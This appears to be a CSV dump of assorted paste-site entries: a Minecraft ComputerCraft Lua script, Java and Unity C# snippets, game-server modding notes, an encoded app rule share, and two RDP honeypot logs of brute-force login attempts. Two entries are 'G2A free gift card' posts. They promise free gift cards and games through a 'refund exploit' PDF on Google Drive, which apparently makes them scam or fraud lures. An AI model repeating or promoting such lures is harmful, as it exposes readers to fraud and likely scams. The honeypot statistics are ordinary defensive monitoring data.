id,title,username,language,date,content
ZqSrvjTz,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Sunday 14th of April 2024 09:07:51 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_157403.pdf

Working as of:
15 April 2024"
LJPCAJjW,startup.lua,enimaloc,Lua,Sunday 14th of April 2024 09:00:29 PM CDT,"-- FRONT = Gate
-- UP = Gate Detector
-- BACK = Control
GATE = ""front""
GATE_DETECTOR = ""up""
TRAIN_CONTROL = ""back""
DETECTOR_1 = ""right""
DETECTOR_2 = ""left""

redstone.setOutput(TRAIN_CONTROL, true)
oldLeft = false
oldRight = false

function getDetector()
    local right = redstone.getInput(DETECTOR_1)
    local left  = redstone.getInput(DETECTOR_2)
    return right, left
end

function awaitDetector()
    os.pullEvent(""redstone"")
    local r, l = getDetector()
    if r or l then
        return r, l
    else
        return awaitDetector()
    end
end

function awaitGate()
    os.pullEvent(""redstone"")
    local gd = redstone.getInput(GATE_DETECTOR)
    if gd then
        return gd
    else
        return awaitGate()
    end
end

function signalGate()
    redstone.setOutput(GATE, true)
    sleep(1)
    redstone.setOutput(GATE, false)
end

while true do
    local right, left = awaitDetector()
    if left ~= oldLeft or right ~= oldRight then
		signalGate()
        os.pullEvent(""redstone"")
        redstone.setOutput(TRAIN_CONTROL, false)
   		local r, l = awaitDetector()
		while not (left and r) and not (right and l) do
			r, l = awaitDetector()
		end
        if (left and r) or (right and l) then
            redstone.setOutput(TRAIN_CONTROL, true)
		    signalGate()
        end
        oldRight = right
        oldLeft = left
    end
end"
2KxwfQW5,邀您一起看：云口令,xiaomianao666,JavaScript,Sunday 14th of April 2024 08:55:53 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥云口令@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5LqR5Y+j5LukXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8veGlhb21pYW5hby5sYW56b3VtLmNvbS9peWFDZDF2NTNpeGNcXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwiXCJ9IiwidGl0bGUiOiLkupHlj6Pku6QifQ==
4pS058Yt,RacePoint to Donation,XConquer,C#,Sunday 14th of April 2024 08:41:12 PM CDT,"how to use/convert RacePoint Store to Donation Store

1.- in the Source and Client find the File named RacePointShop.ini 
2.- Modify the File as u Like for example Delete all items and make Empty File, for example this [ https://prnt.sc/mPY-jrg5zKDW ]
3.- Same Modifys in the SOURCE/CLIENT (Same File)
4.- Explanation of the code in the Shop 
616439  5000  item     other      new
IDITEM	Price NotMove  NotMove	  Sticker new or hot

for example if i want added Wings i make like this 
204009 2000000 item other new

5.- How i can give the Points to Players can make Command or put in Bosses with this Code:
 killer.Owner.RacePoints += 50;//This code is for Points
===================================================
if u want i make all, have a cost."
9jKziZ70,Added Points in the Bosses,XConquer,C#,Sunday 14th of April 2024 08:34:05 PM CDT,"how to added points in the Bosses Drachma or Phoenix at the same 
MonsterTable.cs find Bosses Names example ""SnowBanshee"" and added as u Like 

 killer.DrachmaOfficer += 1;
 killer.ThePhoenix += 1;

so u can modify as u Like.

https://prnt.sc/p8F2yx4_GK35  Check image for example."
gwueP4Kv,Deo koda,El_Azar99,Java,Sunday 14th of April 2024 08:28:46 PM CDT,"int hrs = match.getSchedule().getDateTime().getHour();
int min = match.getSchedule().getDateTime().getMinute();
if ((hrs > 20 || (hrs == 20 && min > 0)) && (this instanceof Stadium)) {
    throw new AddingMatchException(""Match starts too late to be added to Stadium, try earlier than 8pm!"");
} else {
    ArrayList<Athlete> athletesList = match.getAthletesList();
    if (athletesList == null || athletesList.isEmpty()) {
        throw new SportDisciplineException(""No athletes assigned to the match."");
    }
    for (Athlete athlete : athletesList) {
        if (athlete.getDiscipline() != this.getDiscipline()) {
            throw new SportDisciplineException(""Unable to add the match to the venue, as the venue accepts matches of discipline "" + this.getDiscipline() + "", and athlete "" + athlete.getName() + "" assigned to the match competes in discipline "" + athlete.getDiscipline() + ""."");
        }
    }

    for (int i = 0; i < listOfMatches.length; i++) {
        if (listOfMatches[i] == null) {
            listOfMatches[i] = match;
            System.out.println(""Successfully added match: \n"" + match.toString());
            break;
        } else if (i == listOfMatches.length - 1) {
            throw new AddingMatchException(""List of matches is full!"");
        }
    }
}"
C85ZEVa4,Untitled,Diamond32_Tutoriales,C#,Sunday 14th of April 2024 07:51:35 PM CDT,"//CAMBIAR VALORES DESDE ADENTRO DE LAS SALAS
        if (PhotonNetwork.InRoom)
        {
            Hashtable newdata = PhotonNetwork.CurrentRoom.CustomProperties;

            newdata[""HOLA""] = 3000;

            PhotonNetwork.CurrentRoom.SetCustomProperties(newdata);
        }


//CREAR SALA Y ASIGNAR CUSTOMS PROPERTIES
RoomOptions roomOptions = new RoomOptions();
roomOptions.MaxPlayers = 5;
roomOptions.IsVisible = true;
roomOptions.IsOpen = true;

Hashtable roomSettings = new Hashtable();
roomSettings[""HOLA""] = 100;

roomOptions.CustomRoomProperties = roomSettings;
roomOptions.CustomRoomPropertiesForLobby = new string[] { ""HOLA"" };

string roomName = ""Room"" + (Random.Range(10000, 99999)).ToString();

PhotonNetwork.JoinRandomOrCreateRoom(null, 0, MatchmakingMode.FillRoom, TypedLobby.Default, null, roomName, roomOptions);






//OBTENER CUSTOMS PROPERTIES DESDE EL ROOMINFO DESDE EL LOBBY
    public RoomInfo info_room;

    private void Start()
    {
        Hashtable customs = info_room.CustomProperties;

        if (customs.ContainsKey(""HOLA""))
        {
#if UNITY_EDITOR
            Debug.Log(customs[""HOLA""]);
#endif
            GetComponentInChildren<TextMeshProUGUI>().text = ""Room: "" + info_room.Name + "" | Players: "" + info_room.PlayerCount + ""/"" + info_room.MaxPlayers + "" | VALOR: "" + (int)customs[""HOLA""];
        }
        else
        {
            GetComponentInChildren<TextMeshProUGUI>().text = ""Room: "" + info_room.Name + "" | Players: "" + info_room.PlayerCount + ""/"" + info_room.MaxPlayers;
        }
    }"
vNsnKjBK,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Sunday 14th of April 2024 07:47:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
15 April 2024"
3Y0ZwscA,2024-04-14_stats.json,rdp_snitch,JSON,Sunday 14th of April 2024 07:18:24 PM CDT,"{
  ""ip"": {
    ""165.154.129.130"": 3,
    ""58.218.204.183"": 9,
    ""3.110.161.54"": 6,
    ""198.235.24.76"": 9,
    ""194.165.16.73"": 6,
    ""167.99.186.189"": 6,
    ""194.165.16.78"": 6,
    ""152.42.186.54"": 3,
    ""185.170.144.3"": 6,
    ""87.251.75.120"": 6,
    ""152.32.245.196"": 3,
    ""84.17.46.239"": 3,
    ""196.190.117.7"": 6,
    ""205.210.31.171"": 9,
    ""110.42.102.173"": 3,
    ""116.204.125.52"": 9,
    ""36.91.222.100"": 6,
    ""87.251.75.145"": 3,
    ""193.53.245.249"": 3,
    ""112.4.139.162"": 3,
    ""96.8.115.25"": 3,
    ""194.165.16.11"": 6,
    ""45.227.254.26"": 6,
    ""45.227.254.49"": 3,
    ""198.235.24.204"": 9,
    ""87.251.75.64"": 3,
    ""116.140.196.215"": 3,
    ""71.6.134.235"": 30,
    ""152.32.183.213"": 726,
    ""94.232.46.132"": 3,
    ""194.169.175.21"": 3,
    ""205.210.31.52"": 9,
    ""162.142.125.211"": 3
  },
  ""asn"": {
    ""AS135377"": 732,
    ""AS4134"": 9,
    ""AS16509"": 6,
    ""AS396982"": 36,
    ""AS48721"": 18,
    ""AS14061"": 9,
    ""AS197414"": 6,
    ""AS208091"": 12,
    ""AS60068"": 3,
    ""AS24757"": 6,
    ""AS136188"": 3,
    ""AS55990"": 9,
    ""AS7713"": 6,
    ""AS209711"": 3,
    ""AS56046"": 3,
    ""AS36352"": 3,
    ""AS267784"": 9,
    ""AS4837"": 3,
    ""AS10439"": 30,
    ""AS212482"": 3,
    ""AS209605"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 732,
    ""Chinanet"": 9,
    ""Amazon Technologies Inc."": 6,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 27,
    ""DigitalOcean, LLC"": 9,
    ""Xhost Internet Solutions LP"": 21,
    ""DataCamp Limited"": 3,
    ""Ethiotelecom"": 6,
    ""China Telecom"": 3,
    ""Huawei Cloud Service data center"": 9,
    ""PT Telekomunikasi Indonesia"": 6,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""HostPapa"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""CariNet, Inc."": 30,
    ""UAB Host Baltic"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet JS"": 9,
    ""AWS EC2 (ap-south-1)"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 18,
    ""DigitalOcean, LLC"": 6,
    ""Digital Ocean"": 3,
    ""Xhostis"": 6,
    ""Xhost Internet Solutions"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Cdn77 AMS"": 3,
    ""Unknown"": 6,
    ""Ningbo Zhuo Zhi Innovation Network Technology Co., Ltd"": 3,
    ""Wonten Network Ltd."": 9,
    ""Telekomunikasi Indonesia"": 6,
    ""MUVHost - Vodafone Tuzla"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Michael Charlery"": 3,
    ""UAB Host Baltic"": 9,
    ""China United Network Communications Corporation Limited"": 3,
    ""CariNet, Inc."": 30,
    ""Ucloud Information Technology"": 726,
    ""Dmitriy Panchenko"": 3,
    ""EmanuelHosting LTD"": 3,
    ""Censys Inc"": 3
  },
  ""regionName"": {
    ""England"": 3,
    ""Jiangsu"": 12,
    ""Maharashtra"": 6,
    ""California"": 36,
    ""Kaunas"": 21,
    ""Ontario"": 6,
    ""South West"": 3,
    ""North Holland"": 21,
    ""Bangkok"": 3,
    ""Addis Ababa"": 6,
    ""Zhejiang"": 3,
    ""Beijing"": 12,
    ""Jakarta"": 6,
    ""Istanbul"": 3,
    ""Texas"": 3,
    ""Vilnius"": 9,
    ""Nevada"": 30,
    ""Virginia"": 726,
    ""Perm Krai"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""United Kingdom"": 3,
    ""China"": 27,
    ""India"": 6,
    ""United States"": 798,
    ""Lithuania"": 30,
    ""Canada"": 6,
    ""Singapore"": 3,
    ""The Netherlands"": 21,
    ""Thailand"": 3,
    ""Ethiopia"": 6,
    ""Indonesia"": 6,
    ""Turkey"": 3,
    ""Russia"": 3
  },
  ""account"": {
    ""Administrator"": 192,
    ""hello"": 42,
    ""WvLWQQHkf"": 3,
    ""yrSwcd"": 3,
    ""IFTQUa"": 3,
    ""Test"": 36,
    ""Administr"": 24,
    ""LNVZfNLXV"": 3,
    ""flrxNC"": 3,
    ""nmVZfp"": 3,
    ""(empty)"": 12,
    ""kKPHVbV"": 3,
    ""JvmojkaLX"": 3,
    ""dycCjG"": 3,
    ""cuGDNl"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Admin"": 201,
    ""Whatuptime.com"": 180,
    ""Jakartakini123#"": 159,
    ""MyXgIXBAB"": 3,
    ""WyNyMj"": 3,
    ""DgxXTh"": 3
  },
  ""keyboard"": {
    ""Unknown"": 915
  },
  ""client_build"": {
    ""Unknown"": 915
  },
  ""client_name"": {
    ""Unknown"": 915
  },
  ""ip_type"": {
    ""hosting"": 786,
    ""Unknown"": 81,
    ""hosting & proxy"": 42,
    ""mobile"": 3,
    ""proxy"": 3
  }
}"
wjw9d2Gy,2024-04-14_stats.json,rdp_snitch,JSON,Sunday 14th of April 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""165.154.129.130"": 2,
    ""58.218.204.183"": 6,
    ""3.110.161.54"": 4,
    ""198.235.24.76"": 6,
    ""194.165.16.73"": 4,
    ""167.99.186.189"": 4,
    ""194.165.16.78"": 4,
    ""152.42.186.54"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 4,
    ""152.32.245.196"": 2,
    ""84.17.46.239"": 2,
    ""196.190.117.7"": 4,
    ""205.210.31.171"": 6,
    ""110.42.102.173"": 2,
    ""116.204.125.52"": 6,
    ""36.91.222.100"": 4,
    ""87.251.75.145"": 2,
    ""193.53.245.249"": 2,
    ""112.4.139.162"": 2,
    ""96.8.115.25"": 2,
    ""194.165.16.11"": 4,
    ""45.227.254.26"": 4,
    ""45.227.254.49"": 2,
    ""198.235.24.204"": 6,
    ""87.251.75.64"": 2,
    ""116.140.196.215"": 2,
    ""71.6.134.235"": 20,
    ""152.32.183.213"": 484,
    ""94.232.46.132"": 2,
    ""194.169.175.21"": 2,
    ""205.210.31.52"": 6,
    ""162.142.125.211"": 2
  },
  ""asn"": {
    ""AS135377"": 488,
    ""AS4134"": 6,
    ""AS16509"": 4,
    ""AS396982"": 24,
    ""AS48721"": 12,
    ""AS14061"": 6,
    ""AS197414"": 4,
    ""AS208091"": 8,
    ""AS60068"": 2,
    ""AS24757"": 4,
    ""AS136188"": 2,
    ""AS55990"": 6,
    ""AS7713"": 4,
    ""AS209711"": 2,
    ""AS56046"": 2,
    ""AS36352"": 2,
    ""AS267784"": 6,
    ""AS4837"": 2,
    ""AS10439"": 20,
    ""AS212482"": 2,
    ""AS209605"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 488,
    ""Chinanet"": 6,
    ""Amazon Technologies Inc."": 4,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 18,
    ""DigitalOcean, LLC"": 6,
    ""Xhost Internet Solutions LP"": 14,
    ""DataCamp Limited"": 2,
    ""Ethiotelecom"": 4,
    ""China Telecom"": 2,
    ""Huawei Cloud Service data center"": 6,
    ""PT Telekomunikasi Indonesia"": 4,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""HostPapa"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""CariNet, Inc."": 20,
    ""UAB Host Baltic"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet JS"": 6,
    ""AWS EC2 (ap-south-1)"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 12,
    ""DigitalOcean, LLC"": 4,
    ""Digital Ocean"": 2,
    ""Xhostis"": 4,
    ""Xhost Internet Solutions"": 8,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Cdn77 AMS"": 2,
    ""Unknown"": 4,
    ""Ningbo Zhuo Zhi Innovation Network Technology Co., Ltd"": 2,
    ""Wonten Network Ltd."": 6,
    ""Telekomunikasi Indonesia"": 4,
    ""MUVHost - Vodafone Tuzla"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Michael Charlery"": 2,
    ""UAB Host Baltic"": 6,
    ""China United Network Communications Corporation Limited"": 2,
    ""CariNet, Inc."": 20,
    ""Ucloud Information Technology"": 484,
    ""Dmitriy Panchenko"": 2,
    ""EmanuelHosting LTD"": 2,
    ""Censys Inc"": 2
  },
  ""regionName"": {
    ""England"": 2,
    ""Jiangsu"": 8,
    ""Maharashtra"": 4,
    ""California"": 24,
    ""Kaunas"": 14,
    ""Ontario"": 4,
    ""South West"": 2,
    ""North Holland"": 14,
    ""Bangkok"": 2,
    ""Addis Ababa"": 4,
    ""Zhejiang"": 2,
    ""Beijing"": 8,
    ""Jakarta"": 4,
    ""Istanbul"": 2,
    ""Texas"": 2,
    ""Vilnius"": 6,
    ""Nevada"": 20,
    ""Virginia"": 484,
    ""Perm Krai"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""United Kingdom"": 2,
    ""China"": 18,
    ""India"": 4,
    ""United States"": 532,
    ""Lithuania"": 20,
    ""Canada"": 4,
    ""Singapore"": 2,
    ""The Netherlands"": 14,
    ""Thailand"": 2,
    ""Ethiopia"": 4,
    ""Indonesia"": 4,
    ""Turkey"": 2,
    ""Russia"": 2
  },
  ""account"": {
    ""Administrator"": 128,
    ""hello"": 28,
    ""WvLWQQHkf"": 2,
    ""yrSwcd"": 2,
    ""IFTQUa"": 2,
    ""Test"": 24,
    ""Administr"": 16,
    ""LNVZfNLXV"": 2,
    ""flrxNC"": 2,
    ""nmVZfp"": 2,
    ""(empty)"": 8,
    ""kKPHVbV"": 2,
    ""JvmojkaLX"": 2,
    ""dycCjG"": 2,
    ""cuGDNl"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Admin"": 134,
    ""Whatuptime.com"": 120,
    ""Jakartakini123#"": 106,
    ""MyXgIXBAB"": 2,
    ""WyNyMj"": 2,
    ""DgxXTh"": 2
  },
  ""keyboard"": {
    ""Unknown"": 610
  },
  ""client_build"": {
    ""Unknown"": 610
  },
  ""client_name"": {
    ""Unknown"": 610
  },
  ""ip_type"": {
    ""hosting"": 524,
    ""Unknown"": 54,
    ""hosting & proxy"": 28,
    ""mobile"": 2,
    ""proxy"": 2
  }
}"
